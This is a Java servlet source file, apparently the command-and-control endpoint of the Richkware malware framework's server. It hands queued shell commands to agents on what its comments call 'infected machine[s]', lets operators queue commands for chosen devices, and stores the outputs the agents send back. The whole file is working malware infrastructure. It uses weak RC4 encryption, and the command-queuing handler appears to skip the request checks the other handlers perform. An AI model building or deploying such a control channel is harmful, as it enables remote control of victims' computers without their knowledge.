package it.richkmeli.rms.web;

import it.richkmeli.jframework.crypto.Crypto;
import it.richkmeli.jframework.network.tcp.server.http.payload.response.KoResponse;
import it.richkmeli.jframework.network.tcp.server.http.payload.response.OkResponse;
import it.richkmeli.jframework.network.tcp.server.http.util.JServletException;
import it.richkmeli.jframework.orm.DatabaseException;
import it.richkmeli.rms.web.util.RMSServletManager;
import it.richkmeli.rms.web.util.RMSSession;
import it.richkmeli.rms.web.util.RMSStatusCode;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.*;

@WebServlet({"/command"})
public class command extends HttpServlet {
    private String password;

    public command() {
        super();
        password = ResourceBundle.getBundle("configuration").getString("encryptionkey");
    }

    /**
     * GET
     * Richkware Agent use this verb to get commands that have to be executed on the
     * infected machine.
     * Webapp and RMC use this verb to get command outputs
     *
     * @param request
     * @param response
     * @throws IOException
     */

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        PrintWriter out = response.getWriter();
        try {
            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            // TODO il cookie non deve essere controllato se è un richkware agent, negli altri casi si
            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);

            // server session
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();

            String deviceName = attribMap.get("data0");

            String output = null;

            if (RMSServletManager.Channel.RICHKWARE.equalsIgnoreCase(rmsSession.getChannel())) {
                deviceName = Crypto.decryptRC4(deviceName, password);
                output = rmsSession.getDeviceDatabaseManager().getCommands(deviceName);
            } else {
                output = rmsSession.getDeviceDatabaseManager().getCommandsOutput(deviceName);
                output = rmsServletManager.doDefaultProcessResponse(output);
            }
            if (!output.isEmpty()) {
                out.println((new OkResponse(RMSStatusCode.SUCCESS, output)).json());
            } else {
                out.println((new KoResponse(RMSStatusCode.DB_FIELD_EMPTY)).json());
            }
        } catch (DatabaseException e) {
            out.println((new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage())).json());
        } catch (Exception e) {
            out.println((new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage())).json());
        }
    }

    /**
     * PUT
     * Webapp and RMC upload commands that have to be executed on a specific device
     *
     * @param req
     * @param resp
     * @throws IOException
     */
    @Override
    protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        //TODO: gestire richieste per multipli device

        PrintWriter out = resp.getWriter();
        HttpSession httpSession = req.getSession();
        RMSSession rmsSession = null;

        try {
            BufferedReader br = req.getReader();
            String data = br.readLine();
            JSONObject JSONData = new JSONObject(data);
            JSONArray devicesName = JSONData.getJSONArray("devices");
            String commands = JSONData.getString("commands");

            RMSServletManager rmsServletManager = new RMSServletManager(req, resp);
            rmsSession = rmsServletManager.getRMSServerSession();

            List<String> failedResponse = new ArrayList<>();
            for (Object device : devicesName) {
                if (!rmsSession.getDeviceDatabaseManager().editCommands((String) device, commands)) {
                    failedResponse.add((String) device);
                }
            }

            if (failedResponse.isEmpty())
                out.println((new OkResponse(RMSStatusCode.SUCCESS, "commands added.")).json());
            else {
                out.println((new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, Arrays.toString(failedResponse.toArray()))).json());
            }

            br.close();
        } catch (JServletException | JSONException | DatabaseException e) {
            out.println((new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage())).json());
        }
    }

    /**
     * POST
     * Richkware Agent use this verb to upload the command outputs of the command sent before by
     * webapp or RMC with verb PUT
     *
     * @param request
     * @param response
     * @throws IOException
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        PrintWriter out = response.getWriter();
        try {
            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);

            // server session
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();

            // device: deviceID
            // data: command outputs
            if (attribMap.containsKey("device") &&
                    attribMap.containsKey("data") ) {

                String deviceName = attribMap.get("device");
                String commandsOutput = attribMap.get("data");

                //commandsOutput = Crypto.decryptRC4(commandsOutput, password);
                //commandsOutput= new String(Base64.getUrlDecoder().decode(commandsOutput));
                // Reverse command output has to be sent to the front end in base64 format

                boolean result = rmsSession.getDeviceDatabaseManager().setCommandsOutput(deviceName, commandsOutput);
                if (result) {
                    rmsSession.getDeviceDatabaseManager().editCommands(deviceName, "");
                    out.println((new OkResponse(RMSStatusCode.SUCCESS, "editCommands succeeded")).json());
                } else {
                    out.println((new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, "Field not found in DB")).json());
                }
            } else {
                // argomenti non presenti
                out.println((new KoResponse(RMSStatusCode.GENERIC_ERROR, "Parameters missing")).json());
            }
        } catch (JServletException e) {
            out.println(e.getKoResponseJSON());
        } catch (DatabaseException e) {
            out.println((new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage())).json());
        } catch (Exception e) {
            //e.printStackTrace();
            out.println((new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage())).json());
        }


        out.flush();
        out.close();
    }

}
